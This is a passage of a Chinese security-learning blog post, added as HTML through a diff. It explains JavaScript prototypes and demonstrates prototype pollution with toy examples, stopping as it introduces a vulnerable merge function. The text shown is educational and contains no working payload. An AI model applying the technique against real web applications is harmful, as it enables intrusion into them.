@@ -1,0 +1,626 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="前言昨天面试被问到不会的了，问题是python原型链污染和Nodejs原型链污染的区别，刚好只学了python原型链没学js原型链，也算是给自己敲个警钟吧 翻到了p牛的文章深入理解 JavaScript Prototype 污染攻击 前置知识在JavaScript中并没父类和子类的概念，对象是由函数创建的，而函数又是另一种对象。在JavaScript中几乎所有东西都是一种对象，例如 123456v">
+<meta property="og:type" content="article">
+<meta property="og:title" content="js原型链污染">
+<meta property="og:url" content="https://wanth3f1ag.top/2025/05/29/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/index.html">
+<meta property="og:site_name" content="root@wanth3f1ag">
+<meta property="og:description" content="前言昨天面试被问到不会的了，问题是python原型链污染和Nodejs原型链污染的区别，刚好只学了python原型链没学js原型链，也算是给自己敲个警钟吧 翻到了p牛的文章深入理解 JavaScript Prototype 污染攻击 前置知识在JavaScript中并没父类和子类的概念，对象是由函数创建的，而函数又是另一种对象。在JavaScript中几乎所有东西都是一种对象，例如 123456v">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250529143526528.png">
+<meta property="og:image" content="https://wanth3f1ag.top/2025/05/29/image/achieve/202411/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/deepseek_mermaid_20250529_eaabf4.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250529150052817.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250529150127112.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250529154429254.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250529154534250.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250529154627591.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250529155830383.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250529160018922.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250601134859020.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250601135027831.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250601135718672.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/nodejs--ctfshow/image-20250601123040513.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250601185730273.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250601190154163.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250601185556995.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250601190333837.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250601152406070.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250601193142087.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250601194027274.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250601194148290.png">
+<meta property="article:published_time" content="2025-05-29T05:41:00.000Z">
+<meta property="article:modified_time" content="2025-06-01T12:19:05.850Z">
+<meta property="article:author" content="wanTh3flag">
+<meta property="article:tag" content="Nodejs原型链污染">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wanth3f1ag.top/image/achieve/202411/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250529143526528.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>js原型链污染</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">H0me</a></li><!--
+     --><!--
+       --><li><a href="/about/">A6out</a></li><!--
+     --><!--
+       --><li><a href="/tags/">T6gs</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Catagory</a></li><!--
+     --><!--
+       --><li><a href="/links/">L1nks</a></li><!--
+     --><!--
+       --><li><a href="/search/">s4arch</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2025/05/30/ctfshow%E5%85%A5%E9%97%A8nodejs/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/05/29/LitCTF2025wp/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/2025/05/29/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/2025/05/29/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/&text=js原型链污染"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/2025/05/29/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/&title=js原型链污染"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/2025/05/29/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/&is_video=false&description=js原型链污染"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=js原型链污染&body=Check out this article: https://wanth3f1ag.top/2025/05/29/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/2025/05/29/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/&title=js原型链污染"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/2025/05/29/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/&title=js原型链污染"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/2025/05/29/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/&title=js原型链污染"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/2025/05/29/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/&title=js原型链污染"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/2025/05/29/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/&name=js原型链污染&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/2025/05/29/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/&t=js原型链污染"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">2.</span> <span class="toc-text">前置知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01%E7%BB%A7%E6%89%BF%E4%B8%8E%E5%8E%9F%E5%9E%8B%E9%93%BE"><span class="toc-number">3.</span> <span class="toc-text">0x01继承与原型链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="toc-number">4.</span> <span class="toc-text">0x02攻击原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#proto-%E5%92%8Cprototype"><span class="toc-number">4.1.</span> <span class="toc-text">__proto__和prototype</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E7%9A%84%E7%BB%A7%E6%89%BF%E6%9C%BA%E5%88%B6"><span class="toc-number">4.2.</span> <span class="toc-text">基于原型链的继承机制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">4.3.</span> <span class="toc-text">原型链污染是什么</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B1%A1%E6%9F%93%E7%9A%84%E6%9D%A1%E4%BB%B6"><span class="toc-number">4.4.</span> <span class="toc-text">污染的条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E5%90%8C%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE"><span class="toc-number">4.5.</span> <span class="toc-text">不同对象的原型链</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ejs%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%AF%BC%E8%87%B4RCE"><span class="toc-number">5.</span> <span class="toc-text">ejs模板引擎原型链污染导致RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E6%8E%A5%E8%BF%91%E7%9C%9F%E7%9B%B8"><span class="toc-number">5.1.</span> <span class="toc-text">源码分析&amp;接近真相</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jade%E6%A8%A1%E6%9D%BF%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%AF%BC%E8%87%B4RCE"><span class="toc-number">6.</span> <span class="toc-text">jade模板原型链污染导致RCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03%E9%A2%98%E7%9B%AE"><span class="toc-number">7.</span> <span class="toc-text">0x03题目</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        js原型链污染
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">wanTh3flag</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-05-29T05:41:00.000Z" class="dt-published" itemprop="datePublished">2025-05-29</time>
+        
+        (Updated: <time datetime="2025-06-01T12:19:05.850Z" class="dt-updated" itemprop="dateModified">2025-06-01</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">Nodejs原型链污染</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" rel="tag">Nodejs原型链污染</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>昨天面试被问到不会的了，问题是python原型链污染和Nodejs原型链污染的区别，刚好只学了python原型链没学js原型链，也算是给自己敲个警钟吧</p>
+<p>翻到了p牛的文章<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x02-javascript">深入理解 JavaScript Prototype 污染攻击</a></p>
+<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>在JavaScript中并没父类和子类的概念，对象是由函数创建的，而函数又是另一种对象。在JavaScript中几乎所有东西都是一种对象，例如</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = &#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span> : <span class="string">&quot;wanth3f1ag&quot;</span>,</span><br><span class="line">    <span class="string">&quot;age&quot;</span> : <span class="number">20</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a.<span class="property">name</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a.<span class="property">age</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/achieve/202411/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250529143526528.png" alt="image-20250529143526528"></p>
+<p>这里访问对象属性的方法不止一种，还能用<code>a[&quot;name&quot;]</code>的方式去访问</p>
+<h2 id="0x01继承与原型链"><a href="#0x01继承与原型链" class="headerlink" title="0x01继承与原型链"></a>0x01继承与原型链</h2><p>在学习原型链污染之前，还是常规套路，就是了解原型链的基础知识，强烈推荐<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Inheritance_and_the_prototype_chain%E8%BF%99%E7%AF%87%E6%96%87%E7%AB%A0%EF%BC%8C%E7%9C%8B%E5%AE%8C%E4%B9%8B%E5%90%8E%E4%BC%9A%E5%AF%B9%E5%8E%9F%E5%9E%8B%E9%93%BE%E5%92%8C%E7%BB%A7%E6%89%BF%E6%9C%89%E4%B8%AA%E5%9F%BA%E6%9C%AC%E7%9A%84%E8%AE%A4%E8%AF%86%EF%BC%8C%E4%B8%8D%E8%BF%87%E6%8E%A5%E4%B8%8B%E6%9D%A5%E6%88%91%E8%BF%98%E6%98%AF%E4%BC%9A%E4%B8%80%E4%B8%80%E4%BB%8B%E7%BB%8D%E7%9A%84">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Inheritance_and_the_prototype_chain这篇文章，看完之后会对原型链和继承有个基本的认识，不过接下来我还是会一一介绍的</a></p>
+<ul>
+<li>什么是继承</li>
+</ul>
+<p>只要学过编程的话，相信对这个概念并不陌生，继承就相当于遗传，从父代传到子代，例如我们a类继承了A类，那么A类父代的特性都会传到a类子代中</p>
+<ul>
+<li>什么是原型</li>
+</ul>
+<p>在 JavaScript 中，原型（prototype）是一个非常重要的概念，每个 JavaScript 对象都有一个与之关联的原型对象，对象会以原型为模板，从原型继承属性和方法，通过原型对象，可以实现属性和方法的共享，并且原型对象也可能有原型</p>
+<img src="../image/achieve/202411/Nodejs原型链污染/deepseek_mermaid_20250529_eaabf4.png" style="zoom: 33%;" />
+
+<ul>
+<li>什么是原型链</li>
+</ul>
+<p>JavaScript 使用对象实现继承。每个对象都有一条链接到另一个称作<em>原型</em>的对象的内部链。该链子就是原型链，原型对象有自己的原型，依此类推，直到原型是 <code>null</code> 的对象。根据定义，<code>null</code> 没有原型，并作为这条<em>原型链</em>中最后的一环。</p>
+<h2 id="0x02攻击原理"><a href="#0x02攻击原理" class="headerlink" title="0x02攻击原理"></a>0x02攻击原理</h2><p>那么设计原型链污染，那肯定离不开<code>__proto__</code>和<code>prototype</code></p>
+<h3 id="proto-和prototype"><a href="#proto-和prototype" class="headerlink" title="__proto__和prototype"></a><code>__proto__</code>和prototype</h3><p>举个例子</p>
+<p>prototype属性</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params">name</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">sayHello</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`你好，<span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span>`</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> alice = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&#x27;Alice&#x27;</span>);</span><br><span class="line">alice.<span class="title function_">sayHello</span>(); <span class="comment">// &quot;你好，Alice&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>所以我们可以认为原型<code>prototype</code>是类<code>Person</code>的一个属性，而所有用<code>Foo</code>类实例化的对象，都将拥有这个属性中的所有内容，包括变量和方法。比如上图中的<code>alice</code>对象，其天生就具有<code>alice.sayHello();</code>方法。</p>
+<p>所以此时我们可以通过访问该属性去访问Person类的原型，但是Person类实例化出来的对象是不能通过prototype访问的，而是需要<code>__proto__</code></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params">name</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数的 prototype 属性</span></span><br><span class="line"><span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">sayHello</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`你好，<span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span>`</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> alice = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&#x27;Alice&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对象的 __proto__ 属性</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(alice.<span class="property">__proto__</span> === <span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>); <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 原型链查找</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(alice.<span class="property">__proto__</span>.<span class="property">__proto__</span> === <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(alice.<span class="property">__proto__</span>.<span class="property">__proto__</span>.<span class="property">__proto__</span>); <span class="comment">// null</span></span><br></pre></td></tr></table></figure>
+
+<p>总结一下：</p>
+<ol>
+<li>一个对象的<code>__proto__</code>属性，指向这个对象所在的类的<code>prototype</code>属性</li>
+<li>每个对象都有一个名为<code>__proto__</code>的内置属性，它指向该对象的原型，每个函数&#x2F;类也都有一个名为 <code>prototype </code>的属性，它指向该函数或类的原型</li>
+<li>当一个类实例化后会用于<code>prototype</code>中所有的属性和方法</li>
+</ol>
+<h3 id="基于原型链的继承机制"><a href="#基于原型链的继承机制" class="headerlink" title="基于原型链的继承机制"></a>基于原型链的继承机制</h3><p>JS有一个特性，当一个对象试图访问一个属性或方法时，如果在该对象自身没有找到，JavaScript 会沿着原型链向上查找，直到找到对应的属性或方法，或者达到原型链的顶端 <code>null</code> 为止。</p>
+<p>手操一下p牛的例子</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Father</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">firstName</span> = <span class="string">&quot;Damn&quot;</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">lastName</span> = <span class="string">&quot;john&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Son</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">firstName</span> = <span class="string">&quot;Tom&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Son</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="keyword">new</span> <span class="title class_">Father</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> son = <span class="keyword">new</span> <span class="title class_">Son</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(son.<span class="property">lastName</span>);</span><br><span class="line"><span class="comment">//john</span></span><br></pre></td></tr></table></figure>
+
+<p>这里的话Son的原型是Father对象实例，那么这里的话Son类其实是继承了Father类的所有属性和方法的，所以这里会输出Father类中的姓john</p>
+<p>然后我们输出一下名字呢发现名字并没有变，从继承机制就可以再次明白这个原因，因为在Son类找得到这个属性，所以不会顺着原型链往上找</p>
+<h3 id="原型链污染是什么"><a href="#原型链污染是什么" class="headerlink" title="原型链污染是什么"></a>原型链污染是什么</h3><p>我们这里举个简单的例子解释一下</p>
+<p><img src="/../image/achieve/202411/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250529150052817.png" alt="image-20250529150052817"></p>
+<p>这里输出了3，是为什么呢？</p>
+<p>先分析一下代码，这里设置了一个对象a中有键值对number&#x3D;1，对象b中有键值对number&#x3D;2，然后执行了一个赋值操作</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b.<span class="property">__proto__</span>.<span class="property">number</span> = <span class="number">3</span></span><br></pre></td></tr></table></figure>
+
+<p>这里有什么特别的呢？我们这里尝试输出一下b的number</p>
+<p><img src="/../image/achieve/202411/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250529150127112.png" alt="image-20250529150127112"></p>
+<p>发现b的number是2，哎，很奇怪，前面不是赋值了吗？我们再输出一下b的原型</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; b.__proto__</span><br><span class="line">[Object: null prototype] &#123; number: 3 &#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现这里原型对象中有一个键值对number&#x3D;3，那么这就解释的通了，这里对b的原型对象设置了一个键值对，然后在访问c的number的时候，因为c对象中并没有number，根据继承机制，会顺着原型链向上寻找，我们看一下c的原型</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; c.__proto__</span><br><span class="line">[Object: null prototype] &#123; number: 3 &#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现这里跟b的原型链一样，那么就可以理解到，b和c的原型都是同一个原型<code>Object.prototype</code>，那么当c往上寻找的时候就会找到这个原型中的number并输出</p>
+<p>所以我们可以得出原型链污染的由来：</p>
+<p>如果我们在一个web应用中能控制并修改了一个对象的原型，那么所有与该对象来自同一个类或者父租类的对象都将会受到影响</p>
+<h3 id="污染的条件"><a href="#污染的条件" class="headerlink" title="污染的条件"></a>污染的条件</h3><p>既然是修改对象的值（原型也是对象），那么找找能够控制对象键名的操作就行（例如python中的merge）</p>
+<p>p牛这里给出了一个merge对象，我们写一个很简单的merge函数实现</p>
